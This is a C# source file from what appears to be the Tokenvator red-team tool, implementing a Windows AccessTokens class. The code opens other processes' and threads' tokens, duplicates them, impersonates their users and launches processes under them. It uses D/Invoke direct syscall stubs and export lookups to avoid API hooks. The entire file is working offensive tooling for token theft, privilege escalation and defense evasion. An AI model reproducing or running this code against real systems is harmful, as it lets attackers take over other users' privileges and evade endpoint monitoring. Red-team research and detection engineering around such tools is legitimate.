using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.ExceptionServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;

using DInvoke.DynamicInvoke;

using Tokenvator.Resources;
using Tokenvator.Plugins.Execution;

using MonkeyWorks.Unmanaged.Headers;
//using MonkeyWorks.Unmanaged.Libraries;

namespace Tokenvator.Plugins.AccessTokens
{
    using MonkeyWorks = MonkeyWorks.Unmanaged.Libraries.DInvoke;

    class AccessTokens : IDisposable
    {
        private bool Disposed = false;

        protected IntPtr phNewToken = IntPtr.Zero;// { private get; set; }
        protected IntPtr hExistingToken = IntPtr.Zero;// { private get; set; }
        protected IntPtr currentProcessToken = IntPtr.Zero;// { private get; set; }

        protected IntPtr hWorkingToken { get; private set; }
        protected IntPtr hWorkingThreadToken { get; private set; }

        protected readonly List<uint> threads = new List<uint>();

        internal delegate bool Create(IntPtr phNewToken, string newProcess, string arguments);

        private IntPtr hNtOpenProcess = IntPtr.Zero;
        private IntPtr hNtOpenProcessToken = IntPtr.Zero;
        private IntPtr hNtOpenThread = IntPtr.Zero;
        private IntPtr hNtOpenThreadToken = IntPtr.Zero;

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Default constructor
        /// </summary>
        /// <param name="currentProcessToken"></param>
        ////////////////////////////////////////////////////////////////////////////////
        public AccessTokens(IntPtr currentProcessToken)
        {        
            phNewToken = new IntPtr();
            hExistingToken = new IntPtr();
            this.currentProcessToken = currentProcessToken;

            hWorkingToken = new IntPtr();
            hWorkingThreadToken = new IntPtr();
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Alternative constructor for instances when OpenProcess/OpenProcessToken isn't called
        /// </summary>
        ////////////////////////////////////////////////////////////////////////////////
        public AccessTokens()
        {
            phNewToken = new IntPtr();
            hExistingToken = new IntPtr();
            currentProcessToken = new IntPtr();

            hWorkingToken = new IntPtr();
            hWorkingThreadToken = new IntPtr();
        }

        #region Get/Set
        ////////////////////////////////////////////////////////////////////////////////
        // Sets hWorkingToken to currentProcessToken
        ////////////////////////////////////////////////////////////////////////////////
        public void SetWorkingTokenToSelf()
        {
            hWorkingToken = currentProcessToken;
            //Console.WriteLine("[*] Setting Working Token to Self: 0x{0}", hWorkingToken.ToString("X4"));
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Sets hWorkingToken to hExisingToken
        ////////////////////////////////////////////////////////////////////////////////
        public void SetWorkingTokenToRemote()
        {
            hWorkingToken = hExistingToken;
            //Console.WriteLine("[*] Setting Working Token to Remote: 0x{0}", hWorkingToken.ToString("X4"));
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Sets hWorkingThreadToken to hExisingThreadToken
        ////////////////////////////////////////////////////////////////////////////////
        public void SetWorkingThreadTokenToRemote()
        {
            hWorkingThreadToken = hExistingToken;
            //Console.WriteLine("[*] Setting Working Token to Remote: 0x{0}", hWorkingToken.ToString("X4"));
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Sets hWorkingToken to phNewToken
        ////////////////////////////////////////////////////////////////////////////////
        public void SetWorkingTokenToNewToken()
        {
            hWorkingToken = phNewToken;
            //Console.WriteLine("[*] Setting Working Token to New Token: 0x{0}", hWorkingToken.ToString("X4"));

        }

        ////////////////////////////////////////////////////////////////////////////////
        // Sets hWorkingToken to hWorkingThreadToken
        ////////////////////////////////////////////////////////////////////////////////
        public void SetWorkingTokenToThreadToken()
        {
            hWorkingToken = hWorkingThreadToken;
            //Console.WriteLine("[*] Setting Working Token to New Token: 0x{0}", hWorkingToken.ToString("X4"));

        }

        ////////////////////////////////////////////////////////////////////////////////
        // Teturns a handle to the current working token
        ////////////////////////////////////////////////////////////////////////////////
        public IntPtr GetWorkingToken()
        {
            return hWorkingToken;
        }
        #endregion

        ////////////////////////////////////////////////////////////////////////////////
        // Move to access tokens - have Impersonate user use this
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        public bool DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL impersonationLevel, Winnt._TOKEN_TYPE tokenType)
        {
            IntPtr hNtDuplicateToken;
            try
            {
                hNtDuplicateToken = Generic.GetSyscallStub("NtDuplicateToken");
            }
            catch (Exception ex)
            {
                Misc.GetExceptionMessage(ex, "GetSyscallStub - NtDuplicateToken");
                return false;
            }

            var fSyscallNtDuplicateToken = (MonkeyWorks.ntdll.NtDuplicateToken)Marshal.GetDelegateForFunctionPointer(hNtDuplicateToken, typeof(MonkeyWorks.ntdll.NtDuplicateToken));

            uint ntRetVal = 0;

            Winnt._SECURITY_QUALITY_OF_SERVICE securityContextTrackingMode = new Winnt._SECURITY_QUALITY_OF_SERVICE()
            {
                Length = (uint)Marshal.SizeOf(typeof(Winnt._SECURITY_QUALITY_OF_SERVICE)),
                ImpersonationLevel = impersonationLevel,//SecurityAnonymous
                ContextTrackingMode = Winnt.SECURITY_CONTEXT_TRACKING_MODE.SECURITY_STATIC_TRACKING,
                EffectiveOnly = Winnt.EFFECTIVE_ONLY.False
            };

            IntPtr hSecurityContextTrackingMode = Marshal.AllocHGlobal(Marshal.SizeOf(securityContextTrackingMode));
            Marshal.StructureToPtr(securityContextTrackingMode, hSecurityContextTrackingMode, false);

            wudfwdm._OBJECT_ATTRIBUTES objectAttributes = new wudfwdm._OBJECT_ATTRIBUTES()
            {
                Length = (uint)Marshal.SizeOf(typeof(wudfwdm._OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                Attributes = 0,
                ObjectName = IntPtr.Zero,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = hSecurityContextTrackingMode
            };

            GCHandle hObjectAttributes = GCHandle.Alloc(objectAttributes, GCHandleType.Pinned);

            try
            {
                ntRetVal = fSyscallNtDuplicateToken(hWorkingToken, (uint)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED, hObjectAttributes.AddrOfPinnedObject(), false, tokenType, ref phNewToken);
            }
            catch (Exception ex)
            {
                Misc.GetExceptionMessage(ex, "NtDuplicateToken");
                return false;
            }
            finally
            {
                hObjectAttributes.Free();
                Marshal.FreeHGlobal(hSecurityContextTrackingMode);
            }

            if (0 != ntRetVal)
            {
                Misc.GetNtError("NtDuplicateToken", ntRetVal);
                return false;
            }

            Console.WriteLine(" [+] Duplicate Token Handle: 0x{0}", phNewToken.ToString("X4"));
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// List all threads for a given process
        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
        /// </summary>
        /// <param name="processId"></param>
        /// <returns>Returns true if successful, returns false if an error or exception was generated</returns>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        public bool ListThreads(int processId)
        {
            if (0 == processId)
            {
                processId = Process.GetCurrentProcess().Id;
            }

            threads.Clear();

            ////////////////////////////////////////////////////////////////////////////////
            // Create a snapshot of all system threads that can be walked through
            // IntPtr hSnapshot = kernel32.CreateToolhelp32Snapshot(TiHelp32.TH32CS_SNAPTHREAD, 0);
            ////////////////////////////////////////////////////////////////////////////////

            IntPtr hKernel32 = Generic.GetPebLdrModuleEntry("kernel32.dll");
            IntPtr hCreateToolhelp32Snapshot = Generic.GetExportAddress(hKernel32, "CreateToolhelp32Snapshot");
            var fCreateToolhelp32Snapshot = (MonkeyWorks.kernel32.CreateToolhelp32Snapshot)Marshal.GetDelegateForFunctionPointer(hCreateToolhelp32Snapshot, typeof(MonkeyWorks.kernel32.CreateToolhelp32Snapshot));
            
            IntPtr hSnapshot;
            try
            {
                hSnapshot = fCreateToolhelp32Snapshot(TiHelp32.TH32CS_SNAPTHREAD, 0);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] CreateToolhelp32Snapshot Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
                return false;
            }

            if (IntPtr.Zero == hSnapshot)
            {
                Misc.GetWin32Error("CreateToolhelp32Snapshot");
                CloseHandle(hKernel32);
                return false;
            }

            ////////////////////////////////////////////////////////////////////////////////
            // Iterate through the first snapshot instance
            // kernel32.Thread32First(hSnapshot, ref threadEntry32);
            ////////////////////////////////////////////////////////////////////////////////

            IntPtr hThread32First = Generic.GetExportAddress(hKernel32, "Thread32First");
            var fThread32First = (MonkeyWorks.kernel32.Thread32First)Marshal.GetDelegateForFunctionPointer(hThread32First, typeof(MonkeyWorks.kernel32.Thread32First));

            TiHelp32.tagTHREADENTRY32 threadEntry32 = new TiHelp32.tagTHREADENTRY32()
            {
                dwSize = (uint)Marshal.SizeOf(typeof(TiHelp32.tagTHREADENTRY32))
            };

            if (!fThread32First(hSnapshot, ref threadEntry32))
            {
                Misc.GetWin32Error("Thread32First");
                return false;
            }

            if (threadEntry32.th32OwnerProcessID == processId)
            {
                threads.Add(threadEntry32.th32ThreadID);
            }

            ////////////////////////////////////////////////////////////////////////////////
            // Iterate through the remainder of the snapshot instances
            // kernel32.Thread32First(hSnapshot, ref threadEntry32);
            ////////////////////////////////////////////////////////////////////////////////

            IntPtr hThread32Next = Generic.GetExportAddress(hKernel32, "Thread32Next");
            var fThread32Next = (MonkeyWorks.kernel32.Thread32Next)Marshal.GetDelegateForFunctionPointer(hThread32Next, typeof(MonkeyWorks.kernel32.Thread32Next));

            while (fThread32Next(hSnapshot, ref threadEntry32))
            {
                if (threadEntry32.th32OwnerProcessID == processId)
                {
                    threads.Add(threadEntry32.th32ThreadID);
                }
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Opens a process Token
        /// Converted to Dinvoke Syscalls 
        /// </summary>
        /// <param name="processId"></param>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        public bool OpenProcessToken(int processId, bool showOutput = true)
        {
            ////////////////////////////////////////////////////////////////////////////////
            // Open a limited handle to the process via a syscall stub
            // IntPtr hProcess = kernel32.OpenProcess(ProcessThreadsApi.ProcessSecurityRights.PROCESS_QUERY_INFORMATION, false, (uint)processId);
            ////////////////////////////////////////////////////////////////////////////////  
            #region NtOpenProcess
            if (IntPtr.Zero == hNtOpenProcess)
            {
                try
                {
                    hNtOpenProcess = Generic.GetSyscallStub("NtOpenProcess");
                }
                catch (Exception ex)
                {
                    Misc.GetExceptionMessage(ex, "GetSyscallStub - NtOpenProcess");
                    return false;
                }
            }

            var fSyscallNtOpenProcess = (MonkeyWorks.ntdll.NtOpenProcess)Marshal.GetDelegateForFunctionPointer(hNtOpenProcess, typeof(MonkeyWorks.ntdll.NtOpenProcess));

            IntPtr hProcess = new IntPtr();
            MonkeyWorks.ntdll.OBJECT_ATTRIBUTES objectAttributes = new MonkeyWorks.ntdll.OBJECT_ATTRIBUTES();
            MonkeyWorks.ntdll.CLIENT_ID clientId = new MonkeyWorks.ntdll.CLIENT_ID
            {
                UniqueProcess = new IntPtr(processId)
            };

            uint ntRetVal = 0;
            try
            {
                ntRetVal = fSyscallNtOpenProcess(ref hProcess, ProcessThreadsApi.ProcessSecurityRights.PROCESS_QUERY_INFORMATION, ref objectAttributes, ref clientId);
            }
            catch (Exception ex)
            {
                Misc.GetExceptionMessage(ex, "GetSyscallStub - NtOpenProcess");
                return false;
            }

            if (0 != ntRetVal)
            {
                if (showOutput)
                {
                    Misc.GetNtError("NtOpenProcess", ntRetVal);
                }
                return false;
            }

            if (showOutput)
            {
                Console.WriteLine("[*] Recieved Process Handle 0x{0}", hProcess.ToString("X4"));
            }
            #endregion

            ////////////////////////////////////////////////////////////////////////////////
            // Open a handle to the process token
            // bool retVal = kernel32.OpenProcessToken(hProcess, (ulong)Winnt.TOKEN_ALL_ACCESS, out hExistingToken)
            //////////////////////////////////////////////////////////////////////////////// 
            #region NtOpenProcessToken
            if (IntPtr.Zero == hNtOpenProcessToken)
            {
                try
                {
                    hNtOpenProcessToken = Generic.GetSyscallStub("NtOpenProcessToken");
                }
                catch (Exception ex)
                {
                    Misc.GetExceptionMessage(ex, "GetSyscallStub - NtOpenProcessToken");
                    return false;
                }
            }

            var fSyscallNtOpenProcessToken = (MonkeyWorks.ntdll.NtOpenProcessToken)Marshal.GetDelegateForFunctionPointer(hNtOpenProcessToken, typeof(MonkeyWorks.ntdll.NtOpenProcessToken));

            ////////////////////////////////////////////////////////////////////////////////
            // Open Token with TOKEN_ALL_ACCESS
            ////////////////////////////////////////////////////////////////////////////////
            try
            {
                ntRetVal = fSyscallNtOpenProcessToken(hProcess, Winnt.TOKEN_ALL_ACCESS, ref hExistingToken);
            }
            catch (Exception ex)
            {
                Misc.GetExceptionMessage(ex, "NtOpenProcessToken");
                return false;
            }

            if (0 != ntRetVal)
            {
                if (showOutput)
                {
                    Misc.GetNtError("NtOpenProcessToken", ntRetVal);
                }

                ////////////////////////////////////////////////////////////////////////////////
                // Retry by Opening Token with MAXIMUM_ALLOWED
                ////////////////////////////////////////////////////////////////////////////////
                if (showOutput)
                {
                    Console.WriteLine(" [*] TOKEN_ALL_ACCESS Failed, Retrying with {0}", Winnt.ACCESS_MASK.MAXIMUM_ALLOWED);
                }

                try
                {
                    ntRetVal = fSyscallNtOpenProcessToken(hProcess, (uint)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED, ref hExistingToken);
                }
                catch (Exception ex)
                {
                    Misc.GetExceptionMessage(ex, "NtOpenProcessToken");
                    return false;
                }

                if (0 != ntRetVal)
                {
                    if (showOutput)
                    {
                        Console.WriteLine(" [-] Unable to Open Process Token");
                        Misc.GetNtError("NtOpenProcessToken", ntRetVal);
                    }
                    CloseHandle(hProcess);
                    return false;
                }
            }

            if (showOutput)
            {
                Console.WriteLine("[*] Recieved Token Handle 0x{0}", hExistingToken.ToString("X4"));
            }
            #endregion

            CloseHandle(hProcess);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Opens a thread token
        /// Converted to D/Invoke Syscalls
        /// </summary>
        /// <param name="threadId"></param>
        /// <param name="permissions"></param>
        /// <returns>Returns true if successful, returns false if an error or exception was generated</returns>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        public bool OpenThreadToken(uint threadId, uint permissions, bool showOutput = true)
        {
            ////////////////////////////////////////////////////////////////////////////////
            // Open a limited handle to the thread via a syscall stub
            // IntPtr hThread = kernel32.OpenThread(ProcessThreadsApi.ThreadSecurityRights.THREAD_QUERY_INFORMATION, false, threadId);
            ////////////////////////////////////////////////////////////////////////////////
            if (IntPtr.Zero == hNtOpenThread)
            {
                try
                {
                    hNtOpenThread = Generic.GetSyscallStub("NtOpenThread");
                }
                catch (Exception ex)
                {
                    Misc.GetExceptionMessage(ex, "GetSyscallStub - NtOpenThread");
                    return false;
                }
            }
            var fSyscallNtOpenThread = (MonkeyWorks.ntdll.NtOpenThread)Marshal.GetDelegateForFunctionPointer(hNtOpenThread, typeof(MonkeyWorks.ntdll.NtOpenThread));

            IntPtr hThread = new IntPtr();
            MonkeyWorks.ntdll.OBJECT_ATTRIBUTES objectAttributes = new MonkeyWorks.ntdll.OBJECT_ATTRIBUTES();
            MonkeyWorks.ntdll.CLIENT_ID clientId = new MonkeyWorks.ntdll.CLIENT_ID
            {
                UniqueThread = new IntPtr(threadId)
            };

            uint ntRetVal;
            try
            {
                //ProcessThreadsApi.ThreadSecurityRights.THREAD_QUERY_INFORMATION
                ntRetVal = fSyscallNtOpenThread(ref hThread, ProcessThreadsApi.ThreadSecurityRights.THREAD_QUERY_INFORMATION, ref objectAttributes, ref clientId);
            }
            catch (Exception ex)
            {
                Misc.GetExceptionMessage(ex, "NtOpenThread");
                return false;
            }

            if (0 != ntRetVal && showOutput)
            {
                Misc.GetNtError("NtOpenThread", ntRetVal);
                return false;
            }
            //Console.WriteLine("[*] Recieved Thread Handle 0x{0}", hThread.ToString("X4"));

            ////////////////////////////////////////////////////////////////////////////////
            // Open a handle to the thread token
            // bool retVal = kernel32.OpenThreadToken(hThread, permissions, false, ref hWorkingThreadToken);
            ////////////////////////////////////////////////////////////////////////////////
            if (IntPtr.Zero == hNtOpenThreadToken)
            {
                try
                {
                    hNtOpenThreadToken = Generic.GetSyscallStub("NtOpenThreadToken");
                }
                catch (Exception ex)
                {
                    Misc.GetExceptionMessage(ex, "GetSyscallStub - NtOpenThreadToken");
                    return false;
                }
            }
            var fSyscallNtOpenThreadToken = (MonkeyWorks.ntdll.NtOpenThreadToken)Marshal.GetDelegateForFunctionPointer(hNtOpenThreadToken, typeof(MonkeyWorks.ntdll.NtOpenThreadToken));

            try
            {
                ntRetVal = fSyscallNtOpenThreadToken(hThread, permissions, false, ref hExistingToken);
            }
            catch (Exception ex)
            {
                Misc.GetExceptionMessage(ex, "NtOpenThreadToken");
                return false;
            }
            finally
            {
                CloseHandle(hThread);
            }

            SetWorkingThreadTokenToRemote();

            if (0 != ntRetVal)
            {
                //Skip error message if no token exists
                if (3221225596 != ntRetVal && showOutput)
                {
                    Console.WriteLine(" [-] Unable to Open Thread Token");
                    Misc.GetNtError("NtOpenThreadToken", ntRetVal);
                }
                return false;
            }
            if (showOutput)
            { 
                Console.WriteLine("[*] Recieved Token Handle 0x{0}", hWorkingThreadToken.ToString("X4"));
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Creates a new process with the duplicated token
        /// No conversions required
        /// </summary>
        /// <param name="newProcess"></param>
        /// <returns>Returns true if successful, returns false if an error or exception was generated</returns>
        ////////////////////////////////////////////////////////////////////////////////
        public bool StartProcessAsUser(string newProcess)
        {
            Create createProcess;
            if (0 == Process.GetCurrentProcess().SessionId || WindowsIdentity.GetCurrent().Owner == WindowsIdentity.GetCurrent().User)
            {
                createProcess = CreateProcess.CreateProcessWithLogonW;
            }
            else
            {
                //This seems to require Admin privileges
                createProcess = CreateProcess.CreateProcessWithTokenW;
            }

            string arguments;
            Misc.FindExe(ref newProcess, out arguments);

            if (!createProcess(hWorkingToken, newProcess, arguments))
            {
                return false;
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Impersonates the token from a specified processId
        /// Converted to D/Invoke Syscalls - still uses kernel32.GetCurrentThread()
        /// </summary>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        public virtual bool ImpersonateUser()
        {
            ////////////////////////////////////////////////////////////////////////////////
            // Duplicate an existing token
            // Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
            // advapi32.DuplicateTokenEx(hWorkingToken, (uint)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED, ref securityAttributes, Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, Winnt._TOKEN_TYPE.TokenPrimary, out phNewToken)
            // This used to work with Winnt._TOKEN_PRIMARY, another MS silent patch
            ////////////////////////////////////////////////////////////////////////////////
            if (!DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, Winnt._TOKEN_TYPE.TokenImpersonation))
            {
                return false;
            }

            ////////////////////////////////////////////////////////////////////////////////
            // Impersonate a newly duplicated token
            // advapi32.ImpersonateLoggedOnUser(phNewToken)            
            ////////////////////////////////////////////////////////////////////////////////
            
            IntPtr hkernel32 = Generic.GetPebLdrModuleEntry("kernel32.dll");
            IntPtr hGetCurrentThread = Generic.GetExportAddress(hkernel32, "GetCurrentThread");
            var fGetCurrentThread = (MonkeyWorks.kernel32.GetCurrentThread)Marshal.GetDelegateForFunctionPointer(hGetCurrentThread, typeof(MonkeyWorks.kernel32.GetCurrentThread));

            IntPtr hThread = IntPtr.Zero;
            try
            {
                hThread = fGetCurrentThread();
            }
            catch (Exception ex)
            {
                Misc.GetExceptionMessage(ex, "GetCurrentThread");
                return false;
            }

            IntPtr hNtSetInformationThread = Generic.GetSyscallStub("NtSetInformationThread");
            var fSyscallNtSetInformationThread = (MonkeyWorks.ntdll.NtSetInformationThread)Marshal.GetDelegateForFunctionPointer(hNtSetInformationThread, typeof(MonkeyWorks.ntdll.NtSetInformationThread));

            uint ntRetVal = 0;
            try
            {
               ntRetVal = fSyscallNtSetInformationThread(hThread, MonkeyWorks.ntdll._THREAD_INFORMATION_CLASS.ThreadImpersonationToken, ref phNewToken, (uint)Marshal.SizeOf(phNewToken));
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] NtSetInformationThread Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
                return false;
            }
            finally
            {
                CloseHandle(hThread);
            }

            if (0 != ntRetVal)
            {
                Misc.GetNtError("NtSetInformationThread", ntRetVal);
                return false;
            }

            Console.WriteLine("[+] Operating as {0}", WindowsIdentity.GetCurrent().Name);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Closes an handle
        /// Converted to D/Invoke Syscalls
        /// </summary>
        /// <param name="handle"></param>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        public bool CloseHandle(IntPtr handle)
        {
            IntPtr hkernel32 = Generic.GetPebLdrModuleEntry("kernel32.dll");
            IntPtr hCloseHandle = Generic.GetExportAddress(hkernel32, "CloseHandle");
            var fCloseHandle = (MonkeyWorks.kernel32.CloseHandle)Marshal.GetDelegateForFunctionPointer(hCloseHandle, typeof(MonkeyWorks.kernel32.CloseHandle));

            if (IntPtr.Zero == handle)
            {
                return true;
            }

            bool retVal = false;
            try
            {
                retVal = fCloseHandle(handle);
            }
            catch (Exception ex)
            {
                if (!(ex is SEHException))
                {
                    Console.WriteLine("[-] NtCloseHandle Generated an Exception");
                    Console.WriteLine("[-] {0}", ex.Message);
                    Console.WriteLine("[-] {0}",  (new StackTrace()).GetFrame(1).GetMethod().Name);
                    return false;
                }
                return true;
            }

            if (!retVal)
            {
                //Misc.GetNtError("NtClose", ntRetVal);
                //Console.WriteLine("[-] {0}", (new StackTrace()).GetFrame(1).GetMethod().Name);
                return false;
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Default Deconstructor, disposes if not already disposed
        /// </summary>
        ////////////////////////////////////////////////////////////////////////////////
        ~AccessTokens()
        {
            if (!Disposed)
            {
                Dispose();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Closes all the opened handles
        /// Only Call D/Invoke Syscalls
        /// </summary>
        ////////////////////////////////////////////////////////////////////////////////
        public virtual void Dispose()
        {
            if (IntPtr.Zero != phNewToken)
            {
                //Console.WriteLine("phNewToken");
                //CloseHandle(phNewToken);
            }
            if (IntPtr.Zero != hExistingToken)
            {
                //Console.WriteLine("hExistingToken");
                //CloseHandle(hExistingToken);
            }
            /*
            This should be covered by the other closed handles
            if (IntPtr.Zero != hWorkingToken && currentProcessToken != hWorkingToken)
            {
                Console.WriteLine("hWorkingToken");
                CloseHandle(hWorkingToken);
            }
            */
            if (IntPtr.Zero != hWorkingThreadToken)
            {
                //Console.WriteLine("hWorkingThreadToken");
                //CloseHandle(hWorkingThreadToken);
            }

            Disposed = true;
        }
    }
}
